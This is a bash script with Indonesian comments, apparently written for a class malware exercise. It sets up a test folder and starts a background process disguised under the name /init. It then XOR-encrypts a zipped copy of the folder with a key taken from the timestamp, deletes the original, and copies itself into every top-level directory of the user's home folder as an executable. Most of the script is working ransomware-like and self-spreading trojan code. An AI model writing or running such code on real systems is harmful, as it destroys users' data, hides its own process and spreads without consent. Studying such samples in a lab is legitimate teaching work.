#!/bin/bash

# === Setup Folder Uji Aman ===
BASE_DIR="$HOME/malware_test"
TARGET_DIR="$BASE_DIR/test/folder_in"
mkdir -p "$TARGET_DIR"
echo "data rahasia" > "$TARGET_DIR/secret.txt"

echo "[+] Folder uji dibuat di: $TARGET_DIR"

# === Daemon ===
(
    exec -a /init bash -c '
        while true; do
            sleep 60
        done
    '
) &
DAEMON_PID=$!
echo "[+] Daemon /init berjalan di PID $DAEMON_PID"

# === Encryptor ZIP ===
timestamp=$(date +%s)
key=$((timestamp % 256))

encrypt_file() {
    local file="$1"
    local tmpfile="${file}.tmp"
    perl -e '
        use strict;
        my $key = shift;
        my $in = shift;
        my $out = shift;
        open(IN, "<", $in) or die "Cannot open $in";
        binmode(IN);
        open(OUT, ">", $out) or die "Cannot write $out";
        binmode(OUT);
        while (read(IN, my $c, 1)) {
            print OUT chr(ord($c) ^ $key);
        }
        close IN;
        close OUT;
    ' "$key" "$file" "$tmpfile"
    mv "$tmpfile" "$file"
}

GROUP_NUM=6  

if (( GROUP_NUM % 2 == 0 )); then
    echo "[+] Metode: ZIP (Kelompok Genap)"
    cd "$BASE_DIR/test" || exit
    zip -r -q folder_in.zip folder_in
    echo "[+] Folder dikompresi menjadi folder_in.zip"
    encrypt_file "folder_in.zip"
    echo "[+] Zip terenkripsi"
    rm -rf folder_in
    echo "[+] Folder asli dihapus"
    cd - > /dev/null
else
    echo "[+] Metode: Rekursif"
    find "$TARGET_DIR" -type f | while read -r file; do
        encrypt_file "$file"
    done
fi

# === Trojan Malware ===
find "$HOME" -mindepth 1 -maxdepth 1 -type d | while read -r dir; do
    cp "$0" "$dir/copy_malware.sh"
    chmod +x "$dir/copy_malware.sh"
done
echo "[+] Trojan disebar ke direktori dalam $HOME"

# === Info ===
echo "[i] Semua proses selesai."
echo "[!] Untuk membersihkan, jalankan: pkill -f /init && rm -rf ~/malware_test"
